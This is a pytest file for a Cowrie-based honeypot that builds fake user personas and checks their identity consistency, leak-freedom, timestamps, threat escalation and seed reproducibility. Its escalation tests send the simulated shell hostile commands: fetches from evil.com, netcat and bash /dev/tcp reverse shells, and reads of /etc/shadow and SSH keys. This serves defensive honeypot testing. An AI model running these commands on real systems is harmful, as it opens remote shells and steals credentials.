"""Integration tests for profile-based persona personalisation.

Generates student and developer profiles from fixture data, runs the
full dispatcher pipeline, and verifies:
  - identity agreement across all commands
  - no leakage of default persona names
  - timestamp coherence
  - escalation behaviour
  - seed reproducibility
"""
from __future__ import annotations

import json
import re
from datetime import datetime, timezone
from pathlib import Path

import pytest

from honeypot.cowrie_hook import HoneypotCommandDispatcher, create_dispatcher
from honeypot.fakefs import FakeFS
from honeypot.profile_generator import generate_profile_persona
from event_logging.session_logger import SessionLogger

_PERSONAS_DIR = Path(__file__).resolve().parent.parent / "personas"
_LOG_DIR = Path(__file__).resolve().parent.parent / "event_logging" / "logs"

STUDENT_PROFILE = {
    "full_name": "Kavya Chengalath",
    "username": "kavya",
    "role": "student",
    "role_description": "",
    "org": "PES University",
    "interests": ["web-dev", "ML"],
    "hostname": "kavya-laptop",
    "uid": 1000,
    "seed": 12345,
}

DEVELOPER_PROFILE = {
    "full_name": "Kiran Kumar",
    "username": "kiran",
    "role": "developer",
    "role_description": "",
    "org": "Acme Corp",
    "interests": ["backend-api", "infra"],
    "hostname": "kiran-laptop",
    "uid": 1000,
    "seed": 67890,
}

LEAKED_NAMES = {
    "web-srv-03", "dev-workstation-07", "fin-db-prod-01",
    "john.dev", "finapp",
}


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture(scope="module")
def student_paths():
    p = _PERSONAS_DIR / "profile.json"
    e = _PERSONAS_DIR / "profile_escalation.json"
    generate_profile_persona(STUDENT_PROFILE, p, e)
    yield p, e


@pytest.fixture(scope="module")
def developer_paths():
    p = _PERSONAS_DIR / "_test_dev_profile.json"
    e = _PERSONAS_DIR / "_test_dev_escalation.json"
    generate_profile_persona(DEVELOPER_PROFILE, p, e)
    yield p, e
    p.unlink(missing_ok=True)
    e.unlink(missing_ok=True)


def _make_dispatcher(persona: str = "profile") -> HoneypotCommandDispatcher:
    logger = SessionLogger(
        log_dir=str(_LOG_DIR),
        logger_name=f"test_profile_{id(object())}",
    )
    return create_dispatcher(
        attacker_ip="192.0.2.50",
        attacker_port=55555,
        persona_name=persona,
        session_logger=logger,
    )


def _run(disp: HoneypotCommandDispatcher, cmd: str) -> str:
    response, _source = disp.dispatch(cmd)
    return response


def _ls_names(disp: HoneypotCommandDispatcher, path: str) -> set[str]:
    output = _run(disp, f"ls {path}")
    return set(output.split()) if output.strip() else set()


# ---------------------------------------------------------------------------
# Identity agreement tests
# ---------------------------------------------------------------------------

class TestStudentIdentity:

    def test_whoami(self, student_paths) -> None:
        d = _make_dispatcher()
        assert _run(d, "whoami").strip() == "kavya"

    def test_hostname(self, student_paths) -> None:
        d = _make_dispatcher()
        assert _run(d, "hostname").strip() == "kavya-laptop"

    def test_uname_n(self, student_paths) -> None:
        d = _make_dispatcher()
        output = _run(d, "uname -n").strip()
        assert output == "kavya-laptop"

    def test_id(self, student_paths) -> None:
        d = _make_dispatcher()
        output = _run(d, "id").strip()
        assert "kavya" in output
        assert "1000" in output

    def test_cat_etc_passwd(self, student_paths) -> None:
        d = _make_dispatcher()
        output = _run(d, "cat /etc/passwd")
        assert "kavya" in output
        assert "/home/kavya" in output

    def test_cat_etc_hostname(self, student_paths) -> None:
        d = _make_dispatcher()
        output = _run(d, "cat /etc/hostname")
        assert "kavya-laptop" in output

    def test_pwd_at_login(self, student_paths) -> None:
        d = _make_dispatcher()
        output = _run(d, "pwd").strip()
        assert output == "/home/kavya"

    def test_ps1_prompt(self, student_paths) -> None:
        d = _make_dispatcher()
        assert "kavya" in d.prompt
        assert "kavya-laptop" in d.prompt

    def test_ls_home(self, student_paths) -> None:
        d = _make_dispatcher()
        names = _ls_names(d, "/home")
        assert "kavya" in names

    def test_home_has_role_content(self, student_paths) -> None:
        d = _make_dispatcher()
        names = _ls_names(d, "/home/kavya")
        assert "semester-6" in names


class TestDeveloperIdentity:

    def test_whoami(self, developer_paths) -> None:
        d = _make_dispatcher("_test_dev_profile")
        assert _run(d, "whoami").strip() == "kiran"

    def test_hostname(self, developer_paths) -> None:
        d = _make_dispatcher("_test_dev_profile")
        assert _run(d, "hostname").strip() == "kiran-laptop"

    def test_home_has_role_content(self, developer_paths) -> None:
        d = _make_dispatcher("_test_dev_profile")
        names = _ls_names(d, "/home/kiran")
        assert "projects" in names
        # .gitconfig is a dotfile, check with ls -a
        all_names = set(_run(d, "ls -a /home/kiran").split())
        assert ".gitconfig" in all_names


# ---------------------------------------------------------------------------
# No leakage tests
# ---------------------------------------------------------------------------

class TestNoLeakage:
    """Run ~30 common commands and assert no default persona names leak."""

    COMMANDS = [
        "whoami", "id", "hostname", "uname -a", "uname -n",
        "pwd", "ls", "ls /home", "ls /", "ls /etc",
        "cat /etc/passwd", "cat /etc/hostname", "cat /etc/hosts",
        "cat /etc/os-release", "cat /etc/group",
        "ps aux", "env", "w", "uptime", "date",
        "df -h", "free -m", "ifconfig", "ip addr",
        "cat /etc/resolv.conf", "cat /etc/fstab",
        "ls /var/log", "cat /var/log/auth.log",
        "cat /var/log/syslog", "history",
    ]

    def test_student_no_leakage(self, student_paths) -> None:
        d = _make_dispatcher()
        for cmd in self.COMMANDS:
            output = _run(d, cmd)
            for name in LEAKED_NAMES:
                assert name not in output, (
                    f"Leaked '{name}' in output of '{cmd}': {output[:200]}"
                )

    def test_student_no_ubuntu_as_user(self, student_paths) -> None:
        """'ubuntu' must not appear as the username in identity commands."""
        d = _make_dispatcher()
        identity_commands = ["whoami", "id", "w"]
        for cmd in identity_commands:
            output = _run(d, cmd)
            lines = output.strip().splitlines()
            for line in lines:
                # Allow "ubuntu" only as part of OS name strings
                cleaned = line.replace("Ubuntu", "").replace("ubuntu.com", "")
                assert "ubuntu" not in cleaned.lower().split(), (
                    f"'ubuntu' leaked as a user/token in '{cmd}': {line}"
                )


# ---------------------------------------------------------------------------
# Timestamp tests
# ---------------------------------------------------------------------------

class TestTimestamps:

    def test_all_timestamps_in_past(self, student_paths) -> None:
        fs = FakeFS("profile")
        now = datetime.now(tz=timezone.utc)
        for path, entry in fs.persona.filesystem.items():
            if entry.modified:
                m = datetime.fromisoformat(entry.modified.replace("Z", "+00:00"))
                assert m <= now, f"{path} modified={entry.modified} is in the future"
            if entry.created:
                c = datetime.fromisoformat(entry.created.replace("Z", "+00:00"))
                assert c <= now, f"{path} created={entry.created} is in the future"

    def test_created_le_modified(self, student_paths) -> None:
        fs = FakeFS("profile")
        for path, entry in fs.persona.filesystem.items():
            if entry.created and entry.modified:
                assert entry.created <= entry.modified, (
                    f"{path}: created={entry.created} > modified={entry.modified}"
                )

    def test_timestamps_spread_over_months(self, student_paths) -> None:
        fs = FakeFS("profile")
        dates = []
        for entry in fs.persona.filesystem.values():
            if entry.modified:
                dates.append(entry.modified[:7])  # YYYY-MM
        unique_months = set(dates)
        assert len(unique_months) >= 2, (
            f"All timestamps in the same month — expected spread. Months: {unique_months}"
        )


# ---------------------------------------------------------------------------
# Escalation tests
# ---------------------------------------------------------------------------

class TestEscalation:

    def _drive_to_stage(self, disp: HoneypotCommandDispatcher, target_score: int) -> None:
        heavy = [
            "whoami", "uname -a", "id",
            "cat /etc/passwd", "cat /etc/shadow",
            "ps aux", "netstat -tulpn",
            "cat /etc/sudoers", "sudo -l",
            "find / -perm -4000",
            "wget http://evil.com/shell",
            "curl http://evil.com/x",
            "nc -e /bin/sh 1.2.3.4 4444",
            "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
            "cat /root/.ssh/id_rsa",
            "nmap -sV 10.0.0.0/24",
        ]
        for cmd in heavy:
            _run(disp, cmd)
            if disp.session.threat_score >= target_score:
                break

    def test_stage1_adds_files_under_profile_home(self, student_paths) -> None:
        d = _make_dispatcher()
        pre_overlay = set(d.session.overlay.entries.keys())

        self._drive_to_stage(d, 51)
        # Drain transition
        for _ in range(8):
            _run(d, "ls")

        post_overlay = set(d.session.overlay.entries.keys())
        new_paths = post_overlay - pre_overlay
        assert new_paths, "Stage 1 escalation should add overlay entries"
        for p in new_paths:
            assert p.startswith("/home/kavya") or p == "/home", (
                f"Escalation file '{p}' is not under profile home /home/kavya"
            )

    def test_hostname_unchanged_after_escalation(self, student_paths) -> None:
        d = _make_dispatcher()
        self._drive_to_stage(d, 51)
        for _ in range(8):
            _run(d, "ls")
        assert _run(d, "hostname").strip() == "kavya-laptop"

    def test_username_unchanged_after_escalation(self, student_paths) -> None:
        d = _make_dispatcher()
        self._drive_to_stage(d, 51)
        for _ in range(8):
            _run(d, "ls")
        assert _run(d, "whoami").strip() == "kavya"

    def test_nothing_disappears(self, student_paths) -> None:
        d = _make_dispatcher()
        pre_home = _ls_names(d, "/home/kavya")

        self._drive_to_stage(d, 51)
        for _ in range(8):
            _run(d, "ls")

        post_home = _ls_names(d, "/home/kavya")
        disappeared = pre_home - post_home
        assert not disappeared, f"Entries vanished after escalation: {disappeared}"

    def test_max_two_transitions(self, student_paths) -> None:
        d = _make_dispatcher()
        personas_seen = [d.persona_name]

        heavy = [
            "whoami", "uname -a", "id",
            "cat /etc/passwd", "cat /etc/shadow",
            "ps aux", "netstat -tulpn",
            "cat /etc/sudoers", "sudo -l",
            "find / -perm -4000",
            "wget http://evil.com/shell",
            "curl http://evil.com/x",
            "nc -e /bin/sh 1.2.3.4 4444",
            "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
            "cat /root/.ssh/id_rsa",
            "nmap -sV 10.0.0.0/24",
        ]
        for cmd in heavy:
            _run(d, cmd)
            if d.persona_name != personas_seen[-1]:
                personas_seen.append(d.persona_name)

        for _ in range(10):
            _run(d, "ls")
            if d.persona_name != personas_seen[-1]:
                personas_seen.append(d.persona_name)

        transitions = len(personas_seen) - 1
        assert transitions <= 2, f"Too many transitions: {personas_seen}"

    def test_attacker_file_survives(self, student_paths) -> None:
        d = _make_dispatcher()
        _run(d, "touch /home/kavya/test-file.txt")
        pre = _ls_names(d, "/home/kavya")
        assert "test-file.txt" in pre

        self._drive_to_stage(d, 51)
        for _ in range(8):
            _run(d, "ls")

        post = _ls_names(d, "/home/kavya")
        assert "test-file.txt" in post


# ---------------------------------------------------------------------------
# Seed reproducibility
# ---------------------------------------------------------------------------

class TestReproducibility:

    def test_same_seed_same_output(self) -> None:
        p1 = _PERSONAS_DIR / "_test_repro_1.json"
        e1 = _PERSONAS_DIR / "_test_repro_1_esc.json"
        p2 = _PERSONAS_DIR / "_test_repro_2.json"
        e2 = _PERSONAS_DIR / "_test_repro_2_esc.json"

        try:
            generate_profile_persona(STUDENT_PROFILE, p1, e1)
            generate_profile_persona(STUDENT_PROFILE, p2, e2)

            with open(p1) as f1, open(p2) as f2:
                assert json.load(f1) == json.load(f2), (
                    "Same profile + same seed should produce identical persona JSON"
                )
            with open(e1) as f1, open(e2) as f2:
                assert json.load(f1) == json.load(f2), (
                    "Same profile + same seed should produce identical escalation JSON"
                )
        finally:
            for f in (p1, e1, p2, e2):
                f.unlink(missing_ok=True)
